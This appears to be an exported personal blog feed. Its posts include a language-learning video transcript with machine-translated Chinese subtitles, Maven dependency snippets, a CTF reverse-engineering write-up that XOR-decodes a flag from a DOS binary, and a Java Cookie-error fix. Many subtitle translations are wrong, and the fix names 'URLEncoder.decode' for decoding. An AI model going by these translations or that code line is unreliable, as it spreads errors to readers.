    <content><![CDATA[<p>B站大家都知道，你能够找到很多优秀的视频，我在B站上大学可不是闹着玩的，这里分享一位up猪很优秀的视频,采用了纪录片的形式来讨论作者在学习外语的一些想法和观点,”学外语是如何毁了我”,开始我以为会说一些学外语的坏处的，u1s1,我英语不是很好，所以看到这个标题正好(找个借口?)来掩饰我不是不想学，而是学外语会毁了我。然鹅并不是</p>
<p><font color="#856363" size="4" face="Open Sans">“The bigger the circle of the known, the larger the contact with the unknown<br>&nbsp;&nbsp;&nbsp;&nbsp;所知越多，与无知的边界就越大”<br></font></p>
<p>其实就是知道的越少，越不痛苦。。。<br><br></p>
<iframe src="//player.bilibili.com/player.html?aid=756571650&bvid=BV1sr4y1P7P7&cid=293550514&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="100%" height="641">
</iframe>

<p><br><br></p>
<font color="#856363" size="4" face="Open Sans">

<p>in summer 2015 when i was walking by magus books<br>在2015年夏天，当我走过玛格斯书籍时</p>
<p>my favorite bookstore in seattle at three o’clock in the morning<br>我早上三点钟在西雅图最喜欢的书店</p>
<p>my eyes were immediately caught by the title of a book<br>我的眼睛立刻被一本书的标题所吸引</p>
<p>and the yellow glim behind the window so i went there the next morning<br>和窗户后面的黄色微光，所以我第二天早上去了那里</p>
<p>bought it and read it the book is probably not the best collection of<br>买了下来，读了下来，这本书可能不是最好的收藏。</p>
<p>essays i’ve ever read but the title has since then stayed with<br>我读过的论文，但从那时起标题就一直保留</p>
<p>me the moral obligation to be intelligent<br>我的道德义务是要有智慧</p>
<p>what does that have to do with learning languages does speaking foreign<br>说外语与学习语言有什么关系</p>
<p>languages make you more intelligent it depends is the ability to speak<br>语言使您更聪明，这取决于说话能力</p>
<p>another language part of intelligence not necessarily<br>智力的另一种语言部分不一定</p>
<p>but being intelligent and knowing for all languages<br>但要聪明，懂所有语言</p>
<p>do share one thing in common they’re both painful<br>确实有共同点，他们俩都很痛苦</p>
<p>and by painful i don’t mean the annuity of tediously long lectures<br>痛苦的是，我指的不是冗长的演讲的年金</p>
<p>or vocabulary and grammatical studies or the expense of time for the pursuit of<br>或词汇和语法研究，或花费时间追求</p>
<p>wisdom and knowledge nor even the loneliness<br>智慧和知识，甚至寂寞</p>
<p>your dedication to the endeavor could bring up on you<br>您对这项事业的奉献可以助您一臂之力</p>
<p>the pain the true torment is the confusion for the bigger the circle of<br>痛苦，真正的折磨是对更大圈子的困惑</p>
<p>the known the greater the contact with the unknown<br>已知者与未知者的联系越多</p>
<p>and the more firmly unlearned beliefs used to stand the more helplessly your<br>越是坚定地学习过的信念，就越无助于您</p>
<p>new identity totters if you’re lucky enough to study<br>如果您有足够的学习机会，那么新的身份就会tter跷</p>
<p>farsi you may realize that not all the<br>波斯语，您可能会意识到，并非所有</p>
<p>beautiful poetry is written in your mother tongue<br>美丽的诗歌是用你的母语写的</p>
<p>the persian epics written in the sassanid empire<br>萨桑帝国写的波斯史诗</p>
<p>are as beautiful as poems of the tang dynasty<br>和唐诗一样美</p>
<p>if you happen to study spanish you may realize that<br>如果您碰巧学习西班牙语，您可能会意识到</p>
<p>what you thought so unique an aspect of your culture<br>您认为如此独特的文化方面</p>
<p>has a similar counterpart in another culture<br>在另一种文化中有类似的对应者</p>
<p>that the puerto rican amorthia is almost identical<br>波多黎各阿莫里西亚几乎是相同的</p>
<p>with the korean sunday if russian is your language<br>如果您的语言是朝鲜周日</p>
<p>you may realize that not all the important battles<br>您可能会意识到，并非所有重要的战斗</p>
<p>that change the course of human history were fought on your native land<br>改变人类历史进程的斗争是在您的祖国</p>
<p>that the russian defeat of the golden horde at the field of kulikova<br>俄罗斯在库利科娃（Kulikova）战败了金帐汗国</p>
<p>is no less significant than the reconquest of granada<br>不亚于格拉纳达的重新征服</p>
<p>in spain can’t you do this by reading history<br>在西班牙，您不能通过阅读历史记录来做到这一点</p>
<p>one may ask yes but history written by whom<br>一个人可能会问，但是历史是由谁写的</p>
<p>and for whom because you see after learning a language<br>对于谁，因为您在学习语言后会看到</p>
<p>if you care enough part of you becomes the member of the tribe<br>如果您足够在意您成为部落成员的话</p>
<p>to which the language belongs and that cultural schizophrenia<br>语言所属的文化精神分裂症</p>
<p>can be truly excruciating that pain however<br>可以真正消除这种痛苦</p>
<p>can be easily offset but the better chances of employment in your job market<br>可以很容易地抵消，但在您的就业市场上有更好的就业机会</p>
<p>or the simple pleasures of impressing your friends<br>或打动朋友的简单乐趣</p>
<p>at the dinner table with political intrigues and historical anecdotes<br>在饭桌上摆着政治阴谋和历史轶事</p>
<p>played out in five different languages why then would anyone was not a crazy<br>用五种不同的语言表演，为什么没有人会发疯</p>
<p>masochist want to learn a foreign language yes<br>受虐狂想学习一门外语是</p>
<p>to communicate with people yes to travel to different places<br>与人交流是去不同的地方</p>
<p>yes to advance your career in a globalized world<br>是的，可以在全球化的世界中发展事业</p>
<p>yes it is good for your brain but more importantly<br>是的，它对您的大脑有好处，但更重要的是</p>
<p>as potentially excruciating as it is it is for those curious enough<br>对于那些好奇心十足的人</p>
<p>to see the world as it is and those brave enough<br>去看真实的世界，那些勇敢的人</p>
<p>to tear down the veils of bigotry instead of<br>揭开偏执的面纱，而不是</p>
<p>comfortably hiding behind the linguistic barrier and refusing to step forward<br>舒适地躲在语言障碍的后面，拒绝前进</p>
<p>and know your fellow human beings or even the so-called enemies<br>并认识你的人类，甚至是所谓的敌人</p>
<p>i am by no means accusing those not fond of foreign languages<br>我绝不是在指责那些不喜欢外语的人</p>
<p>of being cowards if anything they have to be forever more on their guard<br>胆小鬼，如果有的话，他们需要永远保持警惕</p>
<p>of the bigotries the fatuities and the language barrier<br>偏见的死亡和语言障碍</p>
<p>and constantly seek more reliable sources of information<br>并不断寻求更可靠的信息来源</p>
<p>indeed the pursuit of knowledge is almost by definition<br>确实，对知识的追求几乎是按照定义</p>
<p>a sort of masochism and language learning is no exception<br>某种受虐狂和语言学习也不例外</p>
<p>but in such pain and perhaps only in such pain<br>但在这样的痛苦中，也许只有在这样的痛苦中</p>
<p>can we overcome misunderstandings bridge cultures and civilizations<br>我们能否克服误解桥接文化和文明</p>
<p>and find a world of peace and prosperity<br>找到一个和平与繁荣的世界<br></font></p>
]]></content>
  </entry>
  <entry>
    <title>常见依赖</title>
    <url>/article/96aaf1b0.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b></p>
<p class="note note-secondary">thymeleaf依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- thymeleaf依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.thymeleaf.extras<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>thymeleaf-extras-java8time<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>


<p class="note note-secondary">mysql依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- mysql依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>



<p class="note note-secondary">Spring 日志依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--日志--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.14<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>


<p class="note note-secondary">junit单元测试依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--junit单元测试--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>


<p class="note note-secondary">Spring test依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Spring测试模块--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>


<p class="note note-secondary">lombok依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--lombok插件--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.16.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>


<p class="note note-secondary">shiro依赖</p>

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--shiro依赖--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-all<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;shiro.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
<p></b></font></p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>re学习笔记(1)--[BJDCTF 2nd]8086</title>
    <url>/article/65c9acdf.html</url>
    <content><![CDATA[<p>今天刚好打完省赛，两道re题，只做出来一道，，，希望下次能够尽量都做出来。在吾爱破解上面看到有人一天写一篇关于re题的wp，已经连续记录了有一百多天了。我觉的这样很好，为了防止我可能会懈怠，这里也想模仿一下记录一下自己学习过程，正好省赛结束了，从今天开始，一天一道，到明年省赛应该就将近一年了。<br>大概学习逆向应该有三十天了，其实是不止的，从暑假我就开始学习逆向了，但是正式做CTF题应该是最近一个月开始的，所以就按照三十天算的。想想我成为reverse大师的那一天，，啧啧。</p>
<p>从BUUCTF开始</p>
<p>================================</p>
<a id="more"></a>

<h2 id="0x01-查壳和详细信息"><a href="#0x01-查壳和详细信息" class="headerlink" title="0x01 查壳和详细信息"></a>0x01 查壳和详细信息</h2><p>.exe文件，第一想到的就是先运行一下，没想到失败了。</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-1.png" srcset="/img/loading.gif" alt="1" />

<p>用Exeinfo打开，查看一下信息吧</p>
 <img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-2.png" srcset="/img/loading.gif"  alt="1" />

<p> 这个我是真没看到过。。。试了一下，OD无法识别，IDA无法完成反编译（一开始我的理解），就连查壳软件都不觉得他是一个PE文件。</p>
<h2 id="0x02-分析文件"><a href="#0x02-分析文件" class="headerlink" title="0x02 分析文件"></a>0x02 分析文件</h2><p>用ida打开之后，发现只有两个函数sub_10030和start</p>
<p>看了一下sub_10030函数，死循环</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-3.png" srcset="/img/loading.gif" alt="1" />

<p>查看完汇编后，这时直接就没有什么想法了，看了看题目，8086，估计有点关系，猜测可能和处理器类型有关系。(最后发现其实正常打开也一样)</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-4.png" srcset="/img/loading.gif" alt="1">

<p>8086第一个反应应该都是80x86，而在汇编语言中有种汇编，是十分基础的，被当作示例给大家讲的汇编语言，就是8086汇编。今天早上的微机原理接口第一节课上，满屏幕的都是8086，整本书应该都与这个神奇的东西有关。上网查了一下，8086汇编的程序通常是一个16位的程序，这就是为什么OD认不出来了。(<a href="https://ljzjsc.com/index.php/archives/34/" target="_blank" rel="noopener"> BUUCTF [BJDCTF 2nd]8086</a>)</p>
<p>看一下汇编</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">dseg:0000 ; ===========================================================================<br>dseg:0000<br>dseg:0000 ; Segment type: Pure data<br>dseg:0000 dseg            segment para stack 'DATA'<br>dseg:0000                 assume cs:dseg<br>dseg:0000 aUDuTZWjQGjzZWz db ']U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;',0<br>dseg:0023                 align 10h<br>dseg:0023 dseg            ends<br>dseg:0023<br></code></pre></div></td></tr></table></figure>
<p>第一段数据段是将这串字符串写入物理地址，并取名aUDuTZWjQGjzZWz。</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">seg001:0000 ; ===========================================================================<br>seg001:0000<br>seg001:0000 ; Segment type: Pure code<br>seg001:0000 seg001          segment byte public 'CODE'<br>seg001:0000                 assume cs:seg001<br>seg001:0000                 assume es:nothing, ss:nothing, ds:dseg<br>seg001:0000<br>seg001:0000 ; =============== S U B R O U T I N E =======================================<br>seg001:0000<br>seg001:0000 ; Attributes: noreturn<br>seg001:0000<br>seg001:0000 sub_10030       proc near               ; CODE XREF: sub_10030↓j<br>seg001:0000                                         ; start+5↓p<br>seg001:0000                 jmp     short sub_10030<br>seg001:0000 sub_10030       endp<br>seg001:0000<br>seg001:0000 ; ---------------------------------------------------------------------------<br>seg001:0002                 db 0B9h, 22h, 0, 8Dh, 1Eh, 2 dup(0), 8Bh, 0F9h, 4Fh, 80h<br>seg001:0002                 db 31h, 1Fh, 0E2h, 0F8h, 8Dh, 16h, 2 dup(0), 0B4h, 9, 0CDh<br>seg001:0002                 db 21h, 0C3h<br>seg001:001A                 assume ss:dseg, ds:nothing<br>seg001:001A<br>seg001:001A ; =============== S U B R O U T I N E =======================================<br>seg001:001A<br>seg001:001A ; Attributes: noreturn<br>seg001:001A<br>seg001:001A                 public start<br>seg001:001A start           proc near<br>seg001:001A                 mov     ax, seg dseg<br>seg001:001D                 mov     ds, ax<br>seg001:001F                 assume ds:dseg<br>seg001:001F                 call    sub_10030<br>seg001:001F start           endp<br>seg001:001F<br>seg001:001F ; ---------------------------------------------------------------------------<br>seg001:0022                 db 0B4h, 4Ch, 0CDh, 21h<br>seg001:0022 seg001          ends<br>seg001:0022<br>seg001:0022<br>seg001:0022                 end start<br></code></pre></div></td></tr></table></figure>

<p>之后真的不知道怎么做了，和我一起遇到的题目都不一样。。。<br>后来看了wp，果然是我的盲区。<br>问题出现在这里</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">seg001:<span class="hljs-number">0000</span> ; ---------------------------------------------------------------------------<br>seg001:<span class="hljs-number">0002</span>                 db <span class="hljs-number">0B</span>9h, <span class="hljs-number">22</span>h, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>Dh, <span class="hljs-number">1</span>Eh, <span class="hljs-number">2</span> dup(<span class="hljs-number">0</span>), <span class="hljs-number">8B</span>h, <span class="hljs-number">0F</span>9h, <span class="hljs-number">4F</span>h, <span class="hljs-number">80</span>h<br>seg001:<span class="hljs-number">0002</span>                 db <span class="hljs-number">31</span>h, <span class="hljs-number">1F</span>h, <span class="hljs-number">0E2</span>h, <span class="hljs-number">0F</span>8h, <span class="hljs-number">8</span>Dh, <span class="hljs-number">16</span>h, <span class="hljs-number">2</span> dup(<span class="hljs-number">0</span>), <span class="hljs-number">0B</span>4h, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>CDh<br>seg001:<span class="hljs-number">0002</span>                 db <span class="hljs-number">21</span>h, <span class="hljs-number">0</span>C3h<br>seg001:<span class="hljs-number">001</span>A                 assume ss:dseg, ds:nothing<br>seg001:<span class="hljs-number">001</span>A<br>seg001:<span class="hljs-number">001</span>A ; =============== S U B R O U T I N E =======================================<br></code></pre></div></td></tr></table></figure>

<p>这一段是代码段，就是刚才的死循环段。但是后面还有一串数据，估计就是真正的代码。选中，按C，选force，强制转换成汇编。(确实不知道。。。)</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-5.png" srcset="/img/loading.gif" alt="1">

<p>强制转换之后就是这样的</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-6.png" srcset="/img/loading.gif" alt="1">

<p>真的神奇，以前还真没有遇到这样的，还是做少了。。。</p>
<p>分析一下大概意思就是循环0x22次，将 <code>aUDuTZWjQGjzZWz</code> 进行与 <code>0x1F</code> 异或操作,就结束了。<br>理解不是很难，但是将代码段强制转换成汇编这个知识点我是真的不知道。</p>
<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">Value = <span class="hljs-string">']U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b'</span><br>flag = <span class="hljs-string">''</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Value:<br>	flag += chr(ord(i) ^ <span class="hljs-number">0x1F</span>)<br><br>print(flag)<br></code></pre></div></td></tr></table></figure>



<p>===============================<br>参考文章：<br>    <a href="https://blog.csdn.net/qq_44625297/article/details/105158182" target="_blank" rel="noopener"> buucf - re - [BJDCTF 2nd]8086</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一篇博客文章</title>
    <url>/article/b24dd347.html</url>
    <content><![CDATA[<h3>第一次写这个，弄得头都有点痛了，不过还是很开心的，这里就给大家介绍一首我最近很喜欢的一首老歌吧。

<p>金典之所以能够永流传，是因为它能够触及人的心灵，希望这首歌能够让你想起你的生命中的美好时光</h3></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=299741&auto=0&height=66"></iframe>

<a id="more"></a>

<img src="https://qiniuyun.fxhstudy.com/my-secret-alone-time-sea-shore-clouds-silence-digital-art-4k-5l-3840x2400.jpg" srcset="/img/loading.gif"  alt="1" />

<hr>
<br>
<br>

<br>
<br>
<br>
<br>
<br>
<br>




]]></content>
      <tags>
        <tag>起点</tag>
      </tags>
  </entry>
  <entry>
    <title>异常An invalid character [32] was present in the Cookie value</title>
    <url>/article/b1e6424d.html</url>
    <content><![CDATA[<p>在用到Cookie记录用户访问时间时，页面报错</p>
<p><font color="#FF6B68" size="4" face="Open Sans">An invalid character [32] was present in the Cookie value<br></font></p>
<p>32在ASCII码表中，是space(空格)，</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">"yyyy年MM月dd日 HH:mm:ss"</span>);<br></code></pre></div></td></tr></table></figure>

<p>其中错误的原因是虽然Cookie中支持中文，但是对于特殊的字符还是不支持</p>
<p>所以这里的解决办法是，将Cookie进行URL的编解码即可</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//编码</span><br>URLEncoder.encode(String s)<br><span class="hljs-comment">//解码</span><br>URLEncoder.decode(String s)<br></code></pre></div></td></tr></table></figure>]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>异常</tag>
      </tags>
  </entry>
  <entry>
    <title>提问的智慧</title>
    <url>/article/fb3832f5.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote> 
 <p>提问的智慧, 来自艾瑞克.史蒂文.雷蒙德（Eric Steven Raymond）</p> 
 <p>这是一篇长文，看完需要十几分钟的时间。如果之前没有认真看过并且思考过，这十几分钟会改变你的职业生涯。这文章可能会出现一些让人不适的词语或者过时的例子，但我认为这不会影响它要表达的内容，而你需要好好琢磨作者的思想。</p> 
 <p>《提问的智慧》是一个敲门砖，它把黑客间的礼仪和准则明白地写下来，让我们了解到一个事实，为什么那些看起来很牛的人几乎从不提问。其实他们也有问题，但是通常在提问之前就自己解决了。不是因为他们本来就牛，而是解决问题的经历让他们成为牛人。最终，你只会看到网络上多了一篇文章：关于解决XXX问题的方案。</p> 
 <p>要不要花十几分钟改变自己的人生，决定权在自己。</p> 
</blockquote>

<p>原文的Github☞<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md" target="_blank" rel="noopener">How-To-Ask-Questions-The-Smart-Way</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在<a href="http://www.catb.org/~esr/faqs/hacker-howto.html" target="_blank" rel="nofollow noopener">黑客</a>的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确的提问以获得你满意的答案。</p>
<p>不只是黑客，现在开源（Open Source）软件已经相当盛行，你常常也可以由其他有经验的使用者身上得到好答案，这是件<strong>好事</strong>；使用者比起黑客来，往往对那些新手常遇到的问题更宽容一些。然而，将有经验的使用者视为黑客，并采用本指南所提的方法与他们沟通，同样也是能从他们身上得到满意回答的最有效方式。</p>
<p>首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发他们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，"好问题！"是诚挚的大力称赞。</p>
<p>尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。</p>
<p>我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 —— 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 <code>失败者（撸瑟）</code> （由于历史原因，我们有时把它拼作 <code>lusers</code>）。</p>
